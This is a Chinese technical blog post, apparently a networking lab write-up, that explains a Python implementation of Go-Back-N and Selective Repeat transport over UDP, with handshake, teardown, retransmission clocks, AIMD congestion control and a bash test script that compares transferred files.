<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 客户端</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>(<span class="params">address</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 服务端</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bind</span>(<span class="params">address</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">listen</span>()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">accept</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通用</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">data</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv</span>(<span class="params">[size]</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">close</span>()</span><br></pre></td></tr></table></figure>

<p>真实的accpet函数会返回一个新的套接字，我将其简化为自身就变成与之通信的套接字。</p>
<p>我设计的数据包结构为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet</span> &#123;</span></span><br><span class="line">    <span class="type">uint8_t</span> seqNum;</span><br><span class="line">    <span class="type">uint8_t</span> ackNum; </span><br><span class="line">    <span class="type">uint8_t</span> flag;</span><br><span class="line">    <span class="type">uint8_t</span> checkSum;</span><br><span class="line">    <span class="type">uint8_t</span> data[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>其中flag字段有三个有效bit，定义为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SYN = <span class="number">1</span></span><br><span class="line">FIN = <span class="number">2</span></span><br><span class="line">ACK = <span class="number">4</span></span><br></pre></td></tr></table></figure>

<p>而checkSum计算方法非常简单粗暴，就是把所有字节加起来（模加法），如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">getChecksum</span>(<span class="params">data</span>):</span><br><span class="line">    length = <span class="built_in">len</span>(<span class="built_in">str</span>(data))</span><br><span class="line">    checksum = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, length):</span><br><span class="line">        checksum += <span class="built_in">int</span>.from_bytes(<span class="built_in">bytes</span>(<span class="built_in">str</span>(data)[i], encoding=<span class="string">&#x27;utf-8&#x27;</span>), byteorder=<span class="string">&#x27;little&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line">        checksum &amp;= <span class="number">0xFF</span></span><br><span class="line">    <span class="keyword">return</span> checksum</span><br></pre></td></tr></table></figure>

<h3 id="1-2-滑动窗口"><a href="#1-2-滑动窗口" class="headerlink" title="1.2 滑动窗口"></a>1.2 滑动窗口</h3><p>我为每个socket维护了两个buffer数组，分别用于发送和接收数据（<code>sdata</code> 以及 <code>rdata</code>）。<br>相关的一些指针（其实是index）定义和用途如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># send</span></span><br><span class="line">self.sdata = [<span class="literal">None</span>] * <span class="number">256</span>   <span class="comment"># send data buffer</span></span><br><span class="line">self.spos = <span class="number">0</span>               <span class="comment"># send position (last available sdata + 1)</span></span><br><span class="line">self.sbase = <span class="number">0</span>              <span class="comment"># send base</span></span><br><span class="line">self.snext = <span class="number">0</span>              <span class="comment"># next seq to be sent</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># receive</span></span><br><span class="line">self.rdata = [<span class="literal">None</span>] * <span class="number">256</span>   <span class="comment"># receive data buffer</span></span><br><span class="line">self.rbase = <span class="number">0</span>              <span class="comment"># receive base (not return to app yet)</span></span><br><span class="line">self.rexpect = <span class="number">0</span>            <span class="comment"># expected next seq</span></span><br></pre></td></tr></table></figure>

<p>这些数据在计算时全都模256进行，所以有些运算会很烦，这是我在实现协议时遇到的主要困难之一。</p>
<p>在发送包时，由于是GBN协议，因此seqNum和ackNum两个字段分别用于表示“本条消息对应的序列号”以及“我希望收到的下一个包的序列号”。这里ackNum是一种累计确认，表示自己之前的所有数据包已经接收完毕。</p>
<h3 id="1-3-雏形"><a href="#1-3-雏形" class="headerlink" title="1.3 雏形"></a>1.3 雏形</h3><p>最重要的函数显然是send和recv。<br>我将send、recv、以及一个辅助函数_wait的职能总结如下：</p>
<ul>
<li>send：将新的数据安排到 <code>self.sdata</code> 数组中（更新 <code>self.spos</code>），并在循环中根据窗口大小，发送之前没有发送过的新包（拓展 <code>self.snext</code>）。通过调用 <code>self.wait</code> 来更新 <code>self.sbase</code> ，直到所有将要发送的数据都发送完毕（<code>self.sbase == self.spos</code>）。</li>
<li>recv：<code>self.rbase</code> 表示当前没有被返回至上层的最后一个包，<code>self.rexpect</code> 表示当前已经可以返回的最后一个包。如果它俩相等，说明现在没有可以返回的包，那么recv会调用 <code>self.wait</code> 来更新 <code>self.rexpect</code>；否则recv会返回一个包的数据。</li>
<li>wait：核心函数（不属于API的一部分），负责处理收到的所有包、根据其类型来进行各种操作如发送ACK、存储数据等。其本质是更新 <code>self.sbase</code> 和 <code>self.rexpect</code>。它有recv模式，在该模式下一次超时就会返回调用者（用于recv）；除此以外，它会在结束或遇到错误（如超时次数过多）时返回false，在 <code>self.sbase == self.snext</code> 时（即所有包都确认完毕）返回true。</li>
</ul>
<p>由于是Go-Back-N协议，因此在wait中，如果发生超时，那么从 <code>self.sbase</code> 到 <code>self.snext</code> 的所有包都会被重传。</p>
<p>注意：wait是客户端和服务器端都会使用的函数，因此实现了全双工的统一性。</p>
<h3 id="1-4-连接"><a href="#1-4-连接" class="headerlink" title="1.4 连接"></a>1.4 连接</h3><p>为了标识通信开始、标识通信结束、维护随机化的sbase和rbase，需要实现连接状态。<br>为了实现连接状态，需要设计连接的开始机制和结束机制。</p>
<h4 id="建立连接"><a href="#建立连接" class="headerlink" title="建立连接"></a>建立连接</h4><p>在建立连接时，由客户端向进入listen阶段的服务器端口发送 <code>flag |= SYN</code> 的请求建立连接的报文。同时，客户端将会随机化其 <code>sbase</code>（初始序列号），并把 <code>sbase-1</code> 发送给服务器来让服务器的 <code>rbase</code> 与其同步。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>(<span class="params">self, address</span>):</span><br><span class="line">    <span class="keyword">if</span> (self.connected):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[error] You have connected to addr <span class="subst">&#123;self.address&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># randomize init seq</span></span><br><span class="line">    self.sbase = random.randint(<span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line">    self.snext = self.sbase</span><br><span class="line">    self.spos  = self.sbase</span><br><span class="line"></span><br><span class="line">    self.address = address</span><br><span class="line">    syn_pack = make_pkt((self.sbase-<span class="number">1</span>)%<span class="number">256</span>, <span class="number">0</span>, <span class="string">b&quot;&quot;</span>, start=<span class="literal">True</span>)</span><br><span class="line">    self.udp_send(syn_pack)</span><br></pre></td></tr></table></figure>

<p>服务器端socket首先需要调用bind来绑定某一端口监听，然后调用listen进入服务器状态。服务器状态下才可以调用 <code>accept</code>。（这个设计比较愚蠢，就是为了给listen一个用途而已）</p>
<p>服务器在 <code>accpet</code> 中接收到SYN报文后，将会将其 <code>self.address</code> 更新为客户端地址，其 <code>rbase</code> 更新为 <code>seqNum + 1</code>，随机化它自己的 <code>sbase</code>，然后向客户端发送 <code>SYN | ACK</code> 报文来确认连接。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">accept</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">not</span> self.is_server):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[error] not server&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    self.udp_socket.settimeout(<span class="literal">None</span>)</span><br><span class="line">    rcvpkt, address = self.udp_socket.recvfrom(HEADER_SIZE+BUFFER_SIZE)</span><br><span class="line">    seqNum, ackNum, flag, checksum, data = analyse_pkt(rcvpkt)</span><br><span class="line">    <span class="keyword">if</span> flag &amp; SYN:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[info] SYN from&quot;</span>, address)</span><br><span class="line">        self.connected = <span class="literal">True</span></span><br><span class="line">        self.address = address</span><br><span class="line">        </span><br><span class="line">        self.rbase = (seqNum + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        self.rexpect = self.rbase</span><br><span class="line">        </span><br><span class="line">        self.sbase = random.randint(<span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line">        self.snext = self.sbase</span><br><span class="line">        self.spos  = self.sbase</span><br><span class="line"></span><br><span class="line">        synack_pack = make_pkt(self.sbase, self.rexpect, <span class="string">b&quot;&quot;</span>, start=<span class="literal">True</span>, ack=<span class="literal">True</span>)</span><br><span class="line">        self.udp_send(synack_pack)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[error] not SYN&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br></pre></td></tr></table></figure>

<p>当然，这两条特殊的报文同样要考虑丢包的问题。</p>
<p>在客户端的 <code>connect</code> 函数中，如果收不到SYN ACK，就会一直重传SYN包，直到收到 SYN ACK，如下所示：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">self.udp_socket.settimeout(self.timeout)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        rcvpkt = self.udp_socket.recv(HEADER_SIZE+BUFFER_SIZE)</span><br><span class="line">        seqNum, ackNum, flag, checksum, data = analyse_pkt(rcvpkt)</span><br><span class="line">        <span class="keyword">if</span> (flag &amp; SYN) <span class="keyword">and</span> (flag &amp; ACK) <span class="keyword">and</span> (ackNum == self.sbase):</span><br><span class="line">            self.connected = <span class="literal">True</span></span><br><span class="line">            self.rbase = (seqNum + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">            self.rexpect = self.rbase</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> socket.timeout:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[timeout] SYN ACK&quot;</span>)</span><br><span class="line">        self.udp_send(syn_pack)</span><br></pre></td></tr></table></figure>

<p>而在服务端的 <code>accpet</code> 函数中，我没有设置重传，而是将其放在 <code>wait</code> 函数中。假设SYN ACK包丢包了，客户端会继续向其发送SYN包，而服务器此时会进入 <code>wait</code> 函数进行处理。所以在 <code>wait</code> 中，如果收到了SYN包，那么它会重新发送SYN ACK包，在这里实现重传。</p>
<h4 id="断开连接"><a href="#断开连接" class="headerlink" title="断开连接"></a>断开连接</h4><p>我设计了两种正常断开连接的方法——主动断开和被动断开。不论是服务器还是客户端，都可以主动断开或被动断开。</p>
<p>主动断开即在连接中调用 <code>close</code> 函数。<code>close</code> 会向对方发送一个FIN包（通过设置flag中的FIN bit），然后等待对方发来的FIN ACK。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">close</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">not</span> self.connected):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[info] FIN...&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># send FIN</span></span><br><span class="line">    fin_pack = make_pkt(self.snext, self.rexpect, <span class="string">b&quot;&quot;</span>, stop=<span class="literal">True</span>)</span><br><span class="line">    self.udp_send(fin_pack)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># wait for FIN ACK</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<p>在另一方处理接收到的包的 <code>wait</code> 函数中，如果收到了FIN包，那么它会立即进入断开状态，并向其发送一个FIN ACK包。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># handle FIN</span></span><br><span class="line"><span class="keyword">elif</span> (flag &amp; FIN):</span><br><span class="line">    ack_pkt = make_pkt((self.snext-<span class="number">1</span>)%<span class="number">256</span>, self.rexpect, <span class="string">b&quot;&quot;</span>, ack=<span class="literal">True</span>, stop=<span class="literal">True</span>)</span><br><span class="line">    self.udp_send(ack_pkt)</span><br><span class="line">    self.udp_socket.settimeout(<span class="literal">None</span>)</span><br><span class="line">    self.connected = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p>当然，上面两种情景也需要考虑丢包问题。<br>如果主动发送的FIN包发生丢包，也就是收不到FIN ACK，那么它就会一直重传FIN包。<br>在我的实现中，FIN ACK包只会发送一次，如果它丢包了就说明主动断开的那一方永远收不到FIN ACK了。因此，我在 <code>close</code> 函数中加入了如果超时次数超过 <code>MAX_TIMEOUT</code>，就假装自己收到了FIN ACK。从而也断开连接。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># wait for FIN ACK (close函数，接上文)</span></span><br><span class="line">self.udp_socket.settimeout(self.timeout)</span><br><span class="line">timeout_count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> timeout_count &gt;= MAX_TIMEOUT:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[info] FIN...&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        rcvpkt = self.udp_socket.recv(HEADER_SIZE+BUFFER_SIZE)</span><br><span class="line">        seqNum, ackNum, flag, checksum, data = analyse_pkt(rcvpkt)</span><br><span class="line">        <span class="keyword">if</span> flag &amp; FIN <span class="keyword">and</span> flag &amp; ACK <span class="keyword">and</span> ackNum == self.snext:</span><br><span class="line">            self.connected = <span class="literal">False</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[info] FIN...&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> socket.timeout:</span><br><span class="line">        timeout_count += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[timeout] FIN ACK&quot;</span>)</span><br><span class="line">        self.udp_send(fin_pack)</span><br></pre></td></tr></table></figure>

<h2 id="2-SR"><a href="#2-SR" class="headerlink" title="2 SR"></a>2 SR</h2><p>在SR中，不再使用GBN的累积确认机制，接收方会分别确认每一个收到的包，即使包提前到了也会保存并发送其ACK。此外，对于每一个已发送未确认的包，发送方都会分别维护一个时钟，当某个包的时钟超时了，发送方会单独发送那一个包（所以叫选择重传）。</p>
<p>因此，一个重点是实现（至少逻辑上）分离的时钟，另一个重点就是区分已收到和未收到的包。</p>
<h3 id="2-1-时钟"><a href="#2-1-时钟" class="headerlink" title="2.1 时钟"></a>2.1 时钟</h3><p>为了实现时钟的逻辑分离，我采用了尽量模拟的方法。我将超时间隔减小，作为类似“普朗克时间”或原子时间的概念。每次超时时，检测每个还在计时的时钟，如果他们超时了就进行重传，然后更新时钟。</p>
<p>我为我的socket添加了一个列表域 <code>self.sclkq</code>，全称为send clock queue。它将作为一个队列来使用，其每个元素都是一个 seq：timestamp 的元组。</p>
<p>当一个包（对应一个序列号）在send中被第一次发送时，它的序列号与这时的时间戳组成的元组将会被加入 <code>sclkq</code> 的队尾。如下所示：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># send packets</span></span><br><span class="line"><span class="keyword">while</span> self.sbase != self.spos:</span><br><span class="line">    <span class="keyword">if</span> (self.snext - self.sbase) % <span class="number">256</span> &lt; self.window_size <span class="keyword">and</span> self.snext != self.spos:</span><br><span class="line">        pkt = make_pkt(self.snext, self.rexpect, self.sdata[self.snext])</span><br><span class="line">        self.udp_send(pkt)</span><br><span class="line">        self.sclkq.append((self.snext, time.time()))    <span class="comment"># add to clock queue</span></span><br><span class="line">        self.snext = (self.snext + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self._wait():</span><br><span class="line">            <span class="keyword">return</span></span><br></pre></td></tr></table></figure>

<p>当在wait函数中发生了基础超时，程序将会重复检查 <code>sclkq</code> 的队首，若当前时间戳与其记录的时间戳差值（也就是距离上次发送过去的时间）超过了设置的超时时间，那么程序将会重传这个序列号的包，并把该元组出列，将其序列号与当前的新时间戳构成的元组重新加入队尾。如下代码所示：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">except</span> socket.timeout:</span><br><span class="line">    <span class="keyword">if</span> (recv):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># check clock queue</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(self.sclkq) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> time.time() - self.sclkq[<span class="number">0</span>][<span class="number">1</span>] &gt;= self.timeout:</span><br><span class="line">            pkt = make_pkt(self.sclkq[<span class="number">0</span>][<span class="number">0</span>], self.rexpect, self.sdata[self.sclkq[<span class="number">0</span>][<span class="number">0</span>]])</span><br><span class="line">            self.udp_send(pkt)</span><br><span class="line">            self.sclkq.append((self.sclkq[<span class="number">0</span>][<span class="number">0</span>], time.time()))</span><br><span class="line">            <span class="keyword">del</span> self.sclkq[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>这样一来，就实现了发送方对每个包的单独时钟的选择重传。</p>
<h3 id="2-2-确认"><a href="#2-2-确认" class="headerlink" title="2.2 确认"></a>2.2 确认</h3><p>在SR协议中，ACK表示收到了该序列号的包，而不是累积确认，因此接收方可以提前保存并确认包。如下所示：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># save data</span></span><br><span class="line"><span class="keyword">if</span> getChecksum(data) == checksum:</span><br><span class="line">    <span class="keyword">if</span> self.rdata[seqNum] <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        self.rdata[seqNum] = data</span><br><span class="line"></span><br><span class="line">    <span class="comment"># send ACK</span></span><br><span class="line">    ack_pkt = make_pkt((self.snext-<span class="number">1</span>)%<span class="number">256</span>, seqNum, <span class="string">b&quot;&quot;</span>, ack=<span class="literal">True</span>)</span><br><span class="line">    self.udp_send(ack_pkt)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># update rexpect</span></span><br><span class="line">    i = self.rexpect</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> self.rdata[i] <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        self.rexpect = (self.rexpect + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        i = self.rexpect</span><br></pre></td></tr></table></figure>

<p>注意上段代码中，更新rexpect的方式并不再是简单地加一，而是一直推进到没有收到的地方。区间 $[rbase, rexpect]$ 表示<strong>连续的</strong>可以返回给上层的数据，而rexpect之后可能存在离散的收到的数据，这些数据还不能返回给上层（否则就是乱序了）。</p>
<p>而对于发送方，当接收到ACK时，采用删除其在 <code>sclkq</code> 中的元组的方式，来取消其发送。在遍历 <code>sclkq</code> 时，同时记录最早的仍在队列中的包 <code>crt_min_unacked</code>。如果 <code>crt_min_unacked</code> 和 <code>sbase</code> 不相等，则说明 <code>sbase</code> 可以更新，于是会更新后返回。代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># handle ACK</span></span><br><span class="line"><span class="keyword">if</span> (flag &amp; ACK):</span><br><span class="line">    <span class="comment"># update clock queue</span></span><br><span class="line">    crt_min_unacked = self.snext</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(self.sclkq):</span><br><span class="line">        crt = self.sclkq[i][<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> ackNum == crt:</span><br><span class="line">            self.sclkq.pop(i)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> (crt - self.sbase) % <span class="number">256</span> &lt; (self.snext - self.sbase) % <span class="number">256</span>:  <span class="comment"># in window</span></span><br><span class="line">                <span class="keyword">if</span> crt &lt; WINDOW_SIZE:</span><br><span class="line">                    crt += <span class="number">256</span></span><br><span class="line">                <span class="keyword">if</span> crt &lt; crt_min_unacked:</span><br><span class="line">                    crt_min_unacked = crt</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">    crt_min_unacked %= <span class="number">256</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> self.sbase != crt_min_unacked:</span><br><span class="line">        self.sbase = crt_min_unacked</span><br><span class="line">        self.udp_socket.settimeout(<span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>

<h3 id="2-3-拥塞控制"><a href="#2-3-拥塞控制" class="headerlink" title="2.3 拥塞控制"></a>2.3 拥塞控制</h3><p>至此，SR协议已经完成了。不过我再加入了一些最基础的拥塞控制机制，也就是AIMD。</p>
<p>我通过修改 <code>self.window_size</code> 来完成拥塞控制，<code>send</code> 会根据这个变量来决定发不发送新的包。具体的修改位于 <code>wait</code> 函数中，Additive Increase位于收到ACK且更新 <code>sbase</code> 时，确认数量达到当前的 <code>self.window_size</code> 时就会将其加一，代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># update window size (congestion control)</span></span><br><span class="line">self.ackcount += (crt_min_unacked - self.sbase) % <span class="number">256</span></span><br><span class="line"><span class="keyword">if</span> self.ackcount &gt;= self.window_size:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[CNG_CTRL] add window size from&#x27;</span>, self.window_size, <span class="string">&#x27;to&#x27;</span>, self.window_size+<span class="number">1</span>)</span><br><span class="line">    self.window_size += <span class="number">1</span></span><br><span class="line">    self.ackcount = <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>而Multiplicative Decrease位于处理一个包超时时，每有一个包超时就会触发这个机制，代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># update window size (congestion control)</span></span><br><span class="line">new_window_size = <span class="built_in">max</span>(<span class="number">2</span>, self.window_size // <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[CNG_CTRL] reduce window size from&#x27;</span>, self.window_size, <span class="string">&#x27;to&#x27;</span>, new_window_size)</span><br><span class="line">self.window_size = new_window_size</span><br></pre></td></tr></table></figure>

<h2 id="3-测试"><a href="#3-测试" class="headerlink" title="3 测试"></a>3 测试</h2><p>我编写了测试脚本用于测试客户端和服务端间连接是否可以准确传输整个图片文件，主要逻辑如下：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ((i=<span class="number">1</span>; i&lt;=<span class="variable">$num_runs</span>; i++)); <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">rm</span> ./server_log</span><br><span class="line">    <span class="built_in">rm</span> ./client_log</span><br><span class="line">    python ./sr_server.py 1&gt; ./server_log &amp;</span><br><span class="line">    server_pid=$!</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sleep</span> 1</span><br><span class="line"></span><br><span class="line">    python ./sr_client.py 1&gt; ./client_log</span><br><span class="line"></span><br><span class="line">    <span class="built_in">wait</span> <span class="variable">$server_pid</span></span><br><span class="line"></span><br><span class="line">    cmp -s ./server/recv.jpg ./client/data.jpg</span><br><span class="line">    <span class="keyword">if</span> [ $? -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Test <span class="variable">$i</span>: Files match&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Test <span class="variable">$i</span>: Files do not match&quot;</span></span><br><span class="line">        <span class="built_in">break</span></span><br><span 